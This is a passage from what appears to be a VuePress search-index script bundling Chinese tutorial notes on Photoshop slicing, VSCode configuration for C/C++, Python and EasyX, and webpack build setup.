设备所用格式 → 选择我们要的图片格式 → 存储\",\"注意：保存的时候，要选“选中的切片”\"]},{\"header\":\"3. 插件切图\",\"slug\":\"_3-插件切图\",\"contents\":[]},{\"header\":\"3.1 介绍\",\"slug\":\"_3-1-介绍\",\"contents\":[\"Cutterman 是一款运行在 Photoshop 中的插件，能够自动将你需要的图层进行输出，以替代传统的手工 \\\"导出 web 所用格式\\\" 以及使用切片工具进行挨个切图的繁琐流程\",\"它支持各种各样的图片尺寸、格式、形态输出，方便你在 PC、IOS、Android 等端上使用。它不需要你记住一堆的语法、规则，纯点击操作，方便、快捷，易于上手\"]},{\"header\":\"3.2 安装\",\"slug\":\"_3-2-安装\",\"contents\":[\"注意： cutterman 插件要求你的 ps 必须是完整版，不能是绿色版\",\"查看 “窗口菜单”里面的“扩展功能”：\",\"如果是扩展功能的是灰色的，表示就是绿色版的，需要重新安装 PS\",\"如果是扩展功能右侧是可以使用的，表示就是完整版的，可以安装 cutterman 插件快速切图\",\"官网: http://www.cutterman.cn/zh/cutterman\",\"当 cutterman 安装完成后，重启 PS，会发现扩展功能里面多了一个 cutterman 工具\",\"使用步骤：\",\"选择需要的图层\",\"选择 web 端\",\"选择需要的图片格式\",\"设置好存储路径\",\"点击 “导出选中图层” 按钮\"]}]},\"/software-tool/photoshop/\":{\"title\":\"Photoshop\",\"contents\":[]},\"/software-tool/vscode/01-VSCode%E9%85%8D%E7%BD%AE%E6%8C%87%E5%8D%97.html\":{\"title\":\"VSCode配置指南\",\"contents\":[{\"header\":\"1. 配置回车键代码补全\",\"slug\":\"_1-配置回车键代码补全\",\"contents\":[\"在 （一般都是这个路径）C:\\\\Users\\\\你的用户名\\\\AppData\\\\Roaming\\\\Code\\\\User 下的keybindings.json文件中添加如下代码：\",\"{ \\\"key\\\": \\\"enter\\\", \\\"command\\\": \\\"acceptSelectedSuggestion\\\", \\\"when\\\": \\\"editorTextFocus && suggestWidgetVisible\\\" } \",\"填写完成后重启VSCode即可\"]},{\"header\":\"2. 配置代理\",\"slug\":\"_2-配置代理\",\"contents\":[\"在设置的搜索框中输入“proxy”，然后配置相关代理：\",\"VSCode配置指南01.png\",\"配置完成后重启VSCode即可\"]},{\"header\":\"3. 使用Vim\",\"slug\":\"_3-使用vim\",\"contents\":[\"使用 Vim 可以大幅提高编码效率\",\"找到扩展，安装 Vim 扩展即可\",\"添加如下代码到 setting.json 文件中即可设置 jj 键替代 esc 键\",\"{ \\\"vim.insertModeKeyBindings\\\": [ { \\\"before\\\": [\\\"j\\\", \\\"j\\\"], \\\"after\\\": [\\\"<Esc>\\\"] } ], \",\"添加如下代码到 setting.json 文件中即可设置相对行号\",\"\\\"editor.lineNumbers\\\": \\\"relative\\\", \"]}]},\"/software-tool/vscode/02-VSCode%E5%BC%80%E5%8F%91%E5%B5%8C%E5%85%A5%E5%BC%8F.html\":{\"title\":\"VSCode开发嵌入式\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"使用 Embedded IDE 配合 SDCC 来开发嵌入式 网站中有详细的使用方法\",\"注意：安装时. NET 可能无法自动安装，需自行安装\"]}]},\"/software-tool/vscode/03-VSCode%E9%85%8D%E7%BD%AEC%E5%92%8CCPP%E7%8E%AF%E5%A2%83.html\":{\"title\":\"VSCode配置C和C++环境\",\"contents\":[{\"header\":\"1. C/C++的编译过程\",\"slug\":\"_1-c-c-的编译过程\",\"contents\":[\"从 .c 或 .cpp 文件通过 编译器 来生成 .exe 文件（可执行程序）\",\"编译器将执行以下步骤\",\"预编译 将 .c 中的头文件展开、宏展开，生成的文件是 .i 文件\",\"编译 将预处理之后的 .i 文件生成 .s 汇编文件\",\"汇编 将 .s 汇编文件生成 .o 目标文件\",\"链接 将 .o 文件链接成目标文件\",\"使用命令行为：\",\"$ cd C++文件目录 $ g++ -c test.cpp $ g++ test.o $ ./a.exe \",\"可以使用 -o 来自定义目标文件的名字\",\"$ cd C++文件目录 $ g++ -c test.cpp -o a.o $ g++ a.o -o test.exe $ ./test.exe \",\"或直接使用\",\"$ cd C++文件目录 $ g++ test.cpp $ ./a.exe \",\"可以使用 -o 来自定义目标文件的名字\"]},{\"header\":\"2. GCC 编译器下载和配置\",\"slug\":\"_2-gcc-编译器下载和配置\",\"contents\":[\"GCC 中 C 语言编译器是 gcc，c++编译器是 g++，调试器是 gdb\",\"下载 TDM-GCC 联想应用商店下载链接：TDM-GCC-联想应用商店 下载安装即可\"]},{\"header\":\"3. VSCode 配置 C/C++\",\"slug\":\"_3-vscode-配置-c-c\",\"contents\":[\"下载 C/C++插件\",\"VSCode和C01.png\",\"下载完成后重启 VSCode\",\"配置 新建文件夹（用来放 VSCode 的项目，必须是英文）\",\"在文件夹下创建一个 test1.c 文件 代码如下：\",\"#include <stdio.h> #include <stdlib.h> int main() { printf(\\\"hello world\\\\n\\\"); printf(\\\"你好\\\\n\\\"); system(\\\"pause\\\"); return 0; } \",\"创建一个 test2.cpp 文件 代码如下：\",\"int main() { std::cout << \\\"Hello World 哈哈\\\\n\\\"; system(\\\"pause\\\"); return 0; } \",\"运行,选择 g++编译器，会在文件夹中自动创建 .vscode 文件夹 4. 测试是否成功 5. 设置外部窗口执行 点击右上角齿轮按钮\",\"VSCode和C02.png\",\"点击生成和调试活动文件\",\"VSCode和C03.png\",\"此时 .vscode 文件夹中出现 launch.json 文件 在 launch.json 文件中设置 \\\"externalConsole\\\": false, 将 false 改为 true 6. 中文乱码解决 在 tasks.json 文件中找到 \\\"${fileDirname}\\\\\\\\${fileBasenameNoExtension}.exe\\\", 在其后面添加 , 然后下一行添加 \\\"-fexec-charset=GBK\\\" 即可 9. 设置隐藏. exe 文件 点击设置，搜索：Files: Exclude\",\"VSCode和C04.png\",\"点击添加模式，添加\",\"例如：**/*.exe**/*.class\"]},{\"header\":\"4. 使用命令行进行多文件编译\",\"slug\":\"_4-使用命令行进行多文件编译\",\"contents\":[\"文件目录结构如下\",\"D:. │ main.cpp │ ├─include │ fun.h │ └─src fun.cpp \",\"使用命令\",\"$ g++ .\\\\src\\\\fun.cpp .\\\\main.cpp -o test -I.\\\\include\\\\ \",\"在目录中会生成名称为 test 的可执行文件\"]},{\"header\":\"5. 配置 CMake\",\"slug\":\"_5-配置-cmake\",\"contents\":[]},{\"header\":\"5.1 CMake 环境配置\",\"slug\":\"_5-1-cmake-环境配置\",\"contents\":[\"下载 CMake Download | CMake\",\"安装过程中注意勾选添加系统环境变量\",\"VSCode和C05.png\",\"安装插件 CMake 和 CMake Tools\",\"VSCode和C06.png\",\"安装完成后重启即可\"]},{\"header\":\"5.2 CMake 使用\",\"slug\":\"_5-2-cmake-使用\",\"contents\":[]},{\"header\":\"5.2.1 单文件编译\",\"slug\":\"_5-2-1-单文件编译\",\"contents\":[\"在项目文件中创建一个 CMakeLists.txt 文件，注意，名称不能改变，区分大小写\",\"首先进入文件，文件第一行（第一行必须填写）填写本项目对 CMake 最低版本的要求\",\"# 本项目对 CMake 最低版本的要求 cmake_minimum_required(VERSION 版本号) \",\"注：使用 cmake -version 命令可以查看当前设备的版本号\",\"第二行我们编写项目名称\",\"# 项目名称 project(项目名称) \",\"该命令会创建项目本身，并指定项目名称，每个 CMakeLists 文件只能定义一个项目\",\"第三行我们编写生成可执行文件的名称和包含的文件\",\"# 将源文件编译成一个可执行文件 add_executable(可执行文件名称 源文件) \",\"例：\",\"# 将名为 main.cpp 的源文件编译成一个名称为 myProject 的可执行文件 add_executable(myProject main.cpp) \",\"以上三行是必须的\",\"然后使用快捷键 ctrl+shift+p, 运行 CMake config, 等待配置完成即可\",\"然后运行 CMake build\",\"以上是简单的单文件的编译\"]},{\"header\":\"5.2.2 多文件编译\",\"slug\":\"_5-2-2-多文件编译\",\"contents\":[\"文件目录结构如下\",\"D:. │ main.cpp │ ├─include │ fun.h │ └─src fun.cpp \",\"在项目文件中创建一个 CMakeLists.txt 文件，注意，名称不能改变，区分大小写\",\"CMakeLists.txt 文件中的内容如下\",\"cmake_minimum_required(VERSION 3.25.1) project(myProject) aux_source_directory(src SRC_SUB) aux_source_directory(. SRC_CUR) add_executable(Project ${SRC_SUB} ${SRC_CUR}) include_directories(include) \",\"cmake_minimum_required (VERSION 版本号) : 本项目对 CMake 最低版本的要求\",\"project() ：设置项目名称，参数可以随意指定\",\"aux_source_directory (dir VAR) : 搜索 dir 目录下所有的源文件，并将结果列表存储在变量 VAR 中\",\"add_executable (target src) : 指定使用源文件 src，生成可执行程序 target , ${变量名} 是取变量的值\",\"include_directories (headDir) : 设置包含的头文件目录\",\"然后使用快捷键 ctrl+shift+p, 运行 CMake config, 等待配置完成即可\",\"然后运行 CMake build\",\"或者使用命令行 在终端中进入 build 目录\",\"$ cd build $ cmake .. $ mingw32-make.exe \",\"最终可执行程序就生成到 build 目录中了\"]}]},\"/software-tool/vscode/04-VSCode%E9%85%8D%E7%BD%AEPython%E7%8E%AF%E5%A2%83.html\":{\"title\":\"VSCode配置Python环境\",\"contents\":[{\"header\":\"1. 下载 Python\",\"slug\":\"_1-下载-python\",\"contents\":[\"打开 Python 官网：https://www.python.org/ ，点击 “Download”下载最新 python 版本\",\"VSCode和Python01.png\",\"下载完成后自动弹出安装界面，务必先把下方两个对勾打上，把想要安装的文件夹路径复制下来，再点击 “Install Now”安装。\",\"等待 Python 安装完成。\"]},{\"header\":\"2. 在 VSCode 中安装 Python 插件\",\"slug\":\"_2-在-vscode-中安装-python-插件\",\"contents\":[\"点击 VSCode 界面左边的 “扩展”，在扩展搜索框中输入 Python，选中第一个框后点击 “安装”\",\"VSCode和Python02.png\"]},{\"header\":\"3. 添加环境变量\",\"slug\":\"_3-添加环境变量\",\"contents\":[\"右键点击 “此电脑”，选择 “属性”，点击 “高级系统设置–环境变量”。在系统变量中找到 “Path”，然后点击 “编辑”\",\"VSCode和Python03.png\",\"进入后，点击 “新建”，把复制的 python. exe 路径粘贴上去，点击 “确定”就完成了 Python 环境的配置\",\"VSCode和Python04.png\"]},{\"header\":\"4. 测试 Python\",\"slug\":\"_4-测试-python\",\"contents\":[\"打开 VSCode，点击“新建文件”，并选择保存为 python 类型\",\"VSCode和Python05.png\",\"输入 print (“hello!”) 并运行\",\"VSCode和Python06.png\",\"如果终端出现 “hello!”，表示 Python 程序测试正常。\",\"这样就配置成功了\"]}]},\"/software-tool/vscode/05-VSCode%E4%BD%BF%E7%94%A8EasyX%E5%9B%BE%E5%BD%A2%E5%BA%93.html\":{\"title\":\"VSCode使用EasyX图形库\",\"contents\":[{\"header\":\"1. 安装 TDM-GCC\",\"slug\":\"_1-安装-tdm-gcc\",\"contents\":[\"联想应用商店下载链接：TDM-GCC-联想应用商店 官方网站： tdm-gcc 下载安装即可\"]},{\"header\":\"2. 下载 EasyX 图形库\",\"slug\":\"_2-下载-easyx-图形库\",\"contents\":[\"网址: EasyX，下载库文件，解压完之后将 include 文件夹下的头文件和 lib32/lib64 文件夹下的库文件，分别拷贝到 MinGW 的头文件和库文件文件夹中\",\"VSCode和EasyX01.png\",\"(1) 将 include 文件夹下的 easyx. h 和 graphics. h 拷贝到 C:\\\\TDM-GCC-64\\\\x86_64-w64-mingw32\\\\include\\\\ 文件夹里 (2) 将 lib64\\\\libeasyx. a 拷贝到 C:\\\\TDM-GCC-64\\\\x86_64-w64-mingw32\\\\lib\\\\ 文件夹里 (3) 将 lib32\\\\libeasyx. a 拷贝到 C:\\\\TDM-GCC-64\\\\x86_64-w64-mingw32\\\\lib32\\\\ 文件夹里\"]},{\"header\":\"3. 配置 VSCode\",\"slug\":\"_3-配置-vscode\",\"contents\":[\"在 tasks. json 文件中添加链接\",\"{ \\\"tasks\\\": [ { \\\"type\\\": \\\"cppbuild\\\", \\\"label\\\": \\\"C/C++: g++.exe 生成活动文件\\\", \\\"command\\\": \\\"C:\\\\\\\\TDM-GCC-64\\\\\\\\bin\\\\\\\\g++.exe\\\", \\\"args\\\": [ \\\"-fdiagnostics-color=always\\\", \\\"-g\\\", \\\"${file}\\\", \\\"-o\\\", \\\"${fileDirname}\\\\\\\\${fileBasenameNoExtension}.exe\\\", \\\"-fexec-charset=GBK\\\", \\\"-leasyx\\\"//添加此链接 ], \\\"options\\\": { \\\"cwd\\\": \\\"${fileDirname}\\\" }, \\\"problemMatcher\\\": [ \\\"$gcc\\\" ], \\\"group\\\": { \\\"kind\\\": \\\"build\\\", \\\"isDefault\\\": true }, \\\"detail\\\": \\\"调试器生成的任务。\\\" } ], \\\"version\\\": \\\"2.0.0\\\" } \"]},{\"header\":\"4. 测试\",\"slug\":\"_4-测试\",\"contents\":[\"输入如下代码\",\"#include <graphics.h> #include <conio.h> int main() { initgraph(640, 480); circle(320, 240, 100); getch(); closegraph(); return 0; } \",\"运行出现圆圈即成功\"]}]},\"/software-tool/vscode/\":{\"title\":\"VSCode\",\"contents\":[]},\"/software-tool/webpack/01-webpack%E5%9F%BA%E7%A1%80.html\":{\"title\":\"webpack基础\",\"contents\":[{\"header\":\"1. webpack简介及体验\",\"slug\":\"_1-webpack简介及体验\",\"contents\":[\"Webpack 是一个静态模块打包工具，从入口构建依赖图，打包有关的模块，最后用于展示你的内容\",\"静态模块：编写代码过程中的html、css、js、图片等固定内容的文件\",\"打包过程：\",\"webpack基础01.png\",\"注意：只有和入口有直接/间接引入关系的模块，才会被打包\",\"Webpack 的作用：把静态模块内容，压缩、整合、转译等（前端工程化）\",\"把 less/sass 转成 css 代码\",\"把 ES6+ 降级成 ES5 等\",\"支持多种模块文件类型，多种模块标准语法\",\"体验：\",\"在项目文件夹下初始化包环境\",\"npm init -y \",\"编写代码\",\"下载webpack webpack-cli到项目（版本独立）\",\"npm i webpack webpack-cli --save-dev \",\"注意：虽然 webpack 是全局软件包，封装的是命令工具，但是为了保证项目之间版本分别独立，所以这次比较特殊，下载到某个项目环境下，但是需要把 webpack 命令配置到 package.json 的 scripts 自定义命令，作为局部命令使用\",\"\\\"scripts\\\":{ \\\"build\\\":\\\"webpack\\\" } \",\"项目中运行工具命令，采用自定义命令的方式（局部命令）\",\"npm run build \",\"npm run 自定义命令名字\",\"注意：实际上在终端运行的是 build 右侧的具体命名\",\"自动产生 dist 分发文件夹（压缩和优化后，用于最终运行的代码）\"]},{\"header\":\"2. webpack修改入口和出口\",\"slug\":\"_2-webpack修改入口和出口\",\"contents\":[\"webpack配置：影响 Webpack 打包过程\",\"步骤：\",\"在项目根目录，新建Webpack.config.js配置文件\",\"导出配置对象，配置入口，出口文件路径（别忘了修改磁盘文件夹和文件的名字）\",\"const path = require('path') module.exports = { entry: path.resolve(__dirname, '入口路径及名字'), output: { path: path.resolve(__dirname, 'dist'), filename: '出口路径及名字' } } \",\"例：\",\"const path = require('path') module.exports = { entry: path.resolve(__dirname, 'src/login/index.js'), output: { path: path.resolve(__dirname, 'dist'), filename: './login/index.js' } } \"]},{\"header\":\"3. webpack自动生成html文件\",\"slug\":\"_3-webpack自动生成html文件\",\"contents\":[\"使用html-webpack-plugin插件，可以在 webpack 打包时生成 html 文件并引入其它打包后的资源\",\"步骤：\",\"下载html-webpack-plugin本地软件包到项目中\",\"npm i html-webpack-plugin --save-dev \",\"配置webpack.config.js让webpack拥有插件功能\",\"// ... const HtmlWebpackPlugin = require('html-webpack-plugin') module.exports = { // ... plugins: [ new HtmlWebpackPlugin({ template: './public/login.html', // 模板文件 filename: './login/index.html' // 输出文件 }) ] } //指定以public/login.html为模板复制到dist/login/index.html，并自动引入其他打包后资源 \"]},{\"header\":\"4. webpack打包CSS代码\",\"slug\":\"_4-webpack打包css代码\",\"contents\":[\"注意：webpack 默认只识别 JS 和 JSON 文件内容，所以想要让 webpack 识别更多不同内容，需要使用加载器\",\"需要 2 个加载器来辅助 webpack 才能打包 css 代码：\",\"加载器 css-loader：解析 css 代码\",\"加载器 style-loader：把解析后的 css 代码插入到 DOM（style 标签之间）\",\"步骤：\",\"准备 css 文件引入到 src/login/index.js 中（压缩转译处理等）\",\"/** * 目标：打包 css 代码 * 1 准备 css 代码，并引入到 js 中 * 2 下载 css-loader 和 style-loader 本地软件包 * 3 配置 webpack.config.js 让 Webpack 拥有该加载器功能 * 4 打包后观察效果 */ // 5.1 准备 css 代码，并引入到 js 中 import './index.css' \",\"注意：这里只是引入代码内容让 webpack 处理，不需定义变量接收在 JS 代码中继续使用，所以没有定义变量接收\",\"下载 css-loader 和 style-loader 本地软件包\",\"npm i css-loader style-loader --save-dev \",\"配置 webpack.config.js 让 webpack 拥有该加载器功能\",\"// ... module.exports = { // ... module: { // 加载器 rules: [ // 规则列表 { test: /\\\\.css$/i, // 匹配 .css 结尾的文件 use: ['style-loader', 'css-loader'], // 使用从后到前的加载器来解析 css 代码和插入到 DOM } ] } } \"]},{\"header\":\"5. 优化-提取CSS代码\",\"slug\":\"_5-优化-提取css代码\",\"contents\":[\"让 webpack 把 css 代码内容字符串单独提取到 dist 下的 css 文件中\",\"使用mini-css-extract-plugin插件来实现\",\"步骤：\",\"下载 mini-css-extract-plugin 插件软件包到本地项目中\",\"npm i --save-dev mini-css-extract-plugin \",\"配置 webpack.config.js 让 webpack 拥有该插件功能\",\"// ... const MiniCssExtractPlugin = require(\\\"mini-css-extract-plugin\\\") module.exports = { // ... module: { rules: [ { test: /\\\\.css$/i, // use: ['style-loader', 'css-loader'] use: [MiniCssExtractPlugin.loader, \\\"css-loader\\\"], }, ], }, plugins: [ // ... new MiniCssExtractPlugin() ] } \",\"注意：不能和 style-loader 一起使用\",\"好处：css 文件可以被浏览器缓存，减少 JS 文件体积，让浏览器并行下载 css 和 js 文件\"]},{\"header\":\"6. 优化压缩过程\",\"slug\":\"_6-优化压缩过程\",\"contents\":[\"把提出的 css 文件内样式代码压缩\",\"使用css-minimizer-webpack-plugin插件来实现\",\"步骤：\",\"下载 mini-css-extract-plugin 插件软件包到本地项目中\",\"npm i css-minimizer-webpack-plugin --save-dev \",\"配置 webpack.config.js 让 webpack 拥有该插件功能\",\"// ... const CssMinimizerPlugin = require(\\\"css-minimizer-webpack-plugin\\\"); module.exports = { // ... // 优化 optimization: { // 最小化 minimizer: [ // 在 webpack@5 中，你可以使用 `...` 语法来扩展现有的 minimizer（即`terser-webpack-plugin`），将下一行取消注释（保证 JS 代码还能被压缩处理） `...`, new CssMinimizerPlugin(), ], } } \"]},{\"header\":\"7. webpack-打包less代码\",\"slug\":\"_7-webpack-打包less代码\",\"contents\":[\"加载器 less-loader：把 less 代码编译为 css 代码，还需要依赖 less 软件包\",\"步骤：\",\"新建 login/index.less 文件，设置背景图样式（图片在配套资料-素材文件夹中）\",\"html { body { background: url('./assets/login-bg.png') no-repeat center/cover; } } \",\"less 样式引入到 src/login/index.js 中\",\"/** * 目标8：打包 less 代码 * 8.1 新建 less 代码（设置背景图）并引入到 src/login/index.js 中 * 8.2 下载 less 和 less-loader 本地软件包 * 8.3 配置 webpack.config.js 让 Webpack 拥有功能 * 8.4 打包后观察效果 */ // 8.1 新建 less 代码（设置背景图）并引入到 src/login/index.js 中 import './index.less' \",\"下载 less 和 less-loader 本地软件包\",\"npm i less less-loader --save-dev \",\"配置 webpack.config.js 让 webpack 拥有功能\",\"// ... module.exports = { // ... module: { rules: [ // ... { test: /\\\\.less$/i, use: [MiniCssExtractPlugin.loader, \\\"css-loader\\\", \\\"less-loader\\\"] } ] } } \"]},{\"header\":\"8. webpack-打包图片\",\"slug\":\"_8-webpack-打包图片\",\"contents\":[\"资源模块：webpack 内置了资源模块的打包，无需下载额外 loader\",\"步骤：\",\"配置 webpack.config.js 让 webpack 拥有打包图片功能\",\"占位符 【hash】对模块内容做算法计算，得到映射的数字字母组合的字符串\",\"占位符 【ext】使用当前模块原本的占位符，例如：.png/.jpg 等字符串\",\"占位符 【query】保留引入文件时代码中查询参数（只有 URL 下生效）\",\"注意：判断临界值默认为 8KB\",\"大于 8KB 文件：发送一个单独的文件并导出 URL 地址\",\"小于 8KB 文件：导出一个 data URI（base64字符串）\",\"在 src/login/index.js 中给 img 标签添加 logo 图片\",\"/** * 目标9：打包资源模块（图片处理） * 9.1 创建 img 标签并动态添加到页面，配置 webpack.config.js * 9.2 打包后观察效果和区别 */ // 9.1 创建 img 标签并动态添加到页面，配置 webpack.config.js // 注意：js 中引入本地图片资源要用 import 方式（如果是网络图片http地址，字符串可以直接写） import imgObj from './assets/logo.png' const theImg = document.createElement('img') theImg.src = imgObj document.querySelector('.login-wrap').appendChild(theImg) \",\"配置 webpack.config.js 让 webpack 拥有打包图片功能\",\"// ... module.exports = { // ... module: { rules: [ // ... { test: /\\\\.(png|jpg|jpeg|gif)$/i, type: 'asset', generator: { filename: 'assets/[hash][ext][query]' } } ] } } \"]},{\"header\":\"9. webpack搭建开发环境\",\"slug\":\"_9-webpack搭建开发环境\",\"contents\":[\"每次改动代码，都要重新打包，很麻烦，我们可以给项目集成 webpack-dev-server 开发服务器\",\"作用：启动 Web 服务，打包输出源码在内存，并会自动检测代码变化热更新到网页\",\"步骤；\",\"下载 webpack-dev-server 软件包到当前项目\",\"npm i webpack-dev-server --save-dev \",\"配置自定义命令，并设置打包的模式为开发模式\",\"// ... module.exports = { // ... mode: 'development' } \",\"\\\"scripts\\\": { // ... \\\"dev\\\": \\\"webpack serve --mode=development\\\" }, \",\"使用 npm run dev 来启动开发服务器，访问提示的域名+端口号，在浏览器访问打包后的项目网页，修改代码后试试热更新效果\",\"在 js / css 文件中修改代码保存后，会实时反馈到浏览器\"]},{\"header\":\"10. webpack打包模式\",\"slug\":\"_10-webpack打包模式\",\"contents\":[\"打包模式：告知 webpack 使用相应模式的内置优化\",\"分类：\",\"模式名称\",\"模式名字\",\"特点\",\"场景\",\"开发模式\",\"development\",\"调试代码，实时加载，模块热替换等\",\"本地开发\",\"生产模式\",\"production\",\"压缩代码，资源优化，更轻量等\",\"打包上线\",\"如何设置影响 Webpack呢？\",\"方式1：在 webpack.config.js 配置文件设置 mode 选项\",\"// ... module.exports = { // ... mode: 'production' } \",\"方式2：在 package.json 命令行设置 mode 参数\",\"\\\"scripts\\\": { \\\"build\\\": \\\"webpack --mode=production\\\", \\\"dev\\\": \\\"webpack serve --mode=development\\\" }, \",\"注意：命令行设置的优先级高于配置文件中的，推荐用命令行设置\"]},{\"header\":\"11. webpack打包模式的应用\",\"slug\":\"_11-webpack打包模式的应用\",\"contents\":[\"需求：在开发模式下用 style-loader 内嵌更快，在生产模式下提取 css 代码\",\"方案1：webpack.config.js 配置导出函数，但是局限性大（只接受 2 种模式）\",\"方案2：借助 cross-env （跨平台通用）包命令，设置参数区分环境\",\"方案3：配置不同的 webpack.config.js （适用多种模式差异性较大情况）\",\"主要使用方案 2：\",\"步骤：\",\"下载 cross-env 软件包到当前项目\",\"npm i cross-env --save-dev \",\"配置自定义命令，传入参数名和值（会绑定到 process.env 对象下）\",\"\\\"scripts\\\": { \\\"test\\\": \\\"echo \\\\\\\"Error: no test specified\\\\\\\" && exit 1\\\", \\\"build\\\": \\\"cross-env NODE_ENV=production webpack --mode=production\\\", \\\"dev\\\":\\\"cross-env NODE_ENV=development webpack serve --open --mode-development\\\" \",\"在 webpack.config.js 区分不同环境使用不同配置\",\"module: { rules: [ { test: /\\\\.css$/i, // use: ['style-loader', \\\"css-loader\\\"], use: [process.env.NODE_ENV === 'development' ? 'style-loader' : MiniCssExtractPlugin.loader, \\\"css-loader\\\"] }, { test: /\\\\.less$/i, use: [ // compiles Less to CSS process.env.NODE_ENV === 'development' ? 'style-loader' : MiniCssExtractPlugin.loader, 'css-loader', 'less-loader', ], } ], }, \"]},{\"header\":\"12. webpack前端注入环境变量\",\"slug\":\"_12-webpack前端注入环境变量\",\"contents\":[\"需求：前端项目中，开发模式下打印语句生效，生产模式下打印语句失效\",\"问题：cross-env 设置的只在 Node.js 环境生效，前端代码无法访问 process.env.NODE_ENV\",\"解决：使用 Webpack 内置的 DefinePlugin 插件\",\"作用：在编译时，将前端代码中匹配的变量名，替换为值或表达式\",\"配置 webpack.config.js 中给前端注入环境变量\",\"// ... const webpack = require('webpack') module.exports = { // ... plugins: [ // ... new webpack.DefinePlugin({ // key 是注入到打包后的前端 JS 代码中作为全局变量 // value 是变量对应的值（在 corss-env 注入在 node.js 中的环境变量字符串） 'process.env.NODE_ENV': JSON.stringify(process.env.NODE_ENV) }) ] } \"]},{\"header\":\"13. webpack开发环境调错source map\",\"slug\":\"_13-webpack开发环境调错source-map\",\"contents\":[\"source map可以准确追踪 error 和 warning 在原始代码的位置\",\"问题：代码被压缩和混淆，无法正确定位源代码位置（行数和列数）\",\"设置：webpack.config.js 配置 devtool 选项\",\"// ... module.exports = { // ... devtool: 'inline-source-map' } \",\"inline-source-map 选项：把源码的位置信息一起打包在 JS 文件内\",\"注意：source map 适用于开发环境，不要在生产环境使用（防止被轻易查看源码位置）\"]},{\"header\":\"14. webpack设置解析别名路径\",\"slug\":\"_14-webpack设置解析别名路径\",\"contents\":[\"解析别名可以配置模块如何解析，创建 import 或 require 的别名，来确保模块引入变得更简单\",\"例：\",\"原来路径如下：\",\"import { checkPhone, checkCode } from '../src/utils/check.js' \",\"配置解析别名：在 webpack.config.js 中设置\",\"// ... const config = { // ... resolve: { alias: { '@': path.resolve(__dirname, 'src') } } } \",\"这样我们以后，引入目标模块写的路径就更简单了\",\"import { checkPhone, checkCode } from '@/utils/check.js' \"]},{\"header\":\"15. 优化-CDN使用\",\"slug\":\"_15-优化-cdn使用\",\"contents\":[\"开发模式使用本地第三方库，生产模式下使用 CDN 加载引入\",\"CDN：内容分发网络，指的是一组分布在各个地区的服务器\",\"作用：把静态资源文件/第三方库放在 CDN 网络中各个服务器中，供用户就近请求获取\",\"好处：减轻自己服务器请求压力，就近请求物理延迟低，配套缓存策略\",\"步骤：\",\"在 html 中引入第三方库的CDN地址并用模板语法判断\",\"<% if(htmlWebpackPlugin.options.useCdn){ %> <link href=\\\"https://cdn.bootcdn.net/ajax/libs/twitter-bootstrap/5.2.3/css/bootstrap.min.css\\\" rel=\\\"stylesheet\\\"> <% } %> \",\"配置 webpack.config.js 中externals外部扩展选项（防止某些 import 的包被打包）\",\"// 生产环境下使用相关配置 if (process.env.NODE_ENV === 'production') { // 外部扩展（让 webpack 防止 import 的包被打包进来） config.externals = { // key：import from 语句后面的字符串 // value：留在原地的全局变量（最好和 cdn 在全局暴露的变量一致） 'bootstrap/dist/css/bootstrap.min.css': 'bootstrap', 'axios': 'axios' } } \",\"// ... const config = { // ... plugins: [ new HtmlWebpackPlugin({ // ... // 自定义属性，在 html 模板中 <%=htmlWebpackPlugin.options.useCdn%> 访问使用 useCdn: process.env.NODE_ENV === 'production' }) ] } \"]},{\"header\":\"16. webpack多页面打包\",\"slug\":\"_16-webpack多页面打包\",\"contents\":[\"单页面：单个 html 文件，切换 DOM 的方式实现不同业务逻辑展示\",\"多页面：多个 html 文件，切换页面实现不同业务逻辑展示\",\"步骤：\",\"准备源码（html，css，js）放入相应位置，并改用模块化语法导出\",\"下载 form-serialize 包并导入到核心代码中使用\",\"配置 webpack.config.js 多入口和多页面的设置\",\"// ... const config = { entry: { '模块名1': path.resolve(__dirname, 'src/入口1.js'), '模块名2': path.resolve(__dirname, 'src/入口2.js'), }, output: { path: path.resolve(__dirname, 'dist'), filename: './[name]/index.js' } plugins: [ new HtmlWebpackPlugin({ template: './public/页面2.html', // 模板文件 filename: './路径/index.html', // 输出文件 chunks: ['模块名2'] }) new HtmlWebpackPlugin({ template: './public/页面2.html', // 模板文件 filename: './路径/index.html', // 输出文件 chunks: ['模块名2'] }) ] } \"]},{\"header\":\"17. 优化-分割公共代码\",\"slug\":\"_17-优化-分割公共代码\",\"contents\":[\"需求：把 2 个以上页面引用的公共代码提取\",\"配置 webpack.config.js 的 splitChunks 分割功能\",\"// ... const config = { // ... optimization: { // ... splitChunks: { chunks: 'all', // 所有模块动态非动态移入的都分割分析 cacheGroups: { // 分隔组 commons: { // 抽取公共模块 minSize: 0, // 抽取的chunk最小大小字节 minChunks: 2, // 最小引用数 reuseExistingChunk: true, // 当前 chunk 包含已从主 bundle 中拆分出的模块，则它将被重用 name(module, chunks, cacheGroupKey) { // 分离出模块文件名 const allChunksNames = chunks.map((item) => item.name).join('~') // 模块名1~模块名2 return `./js/${allChunksNames}` // 输出到 dist 目录下位置 } } } } \"]}]},\"/software-tool/webpack/\":{\"title\":\"webpack\",\"contents\":[]}}}");self.onmessage=({data:o})=>{self.postMessage($(o.query,m[o.routeLocale]))};
//# sourceMappingURL=original.js.map
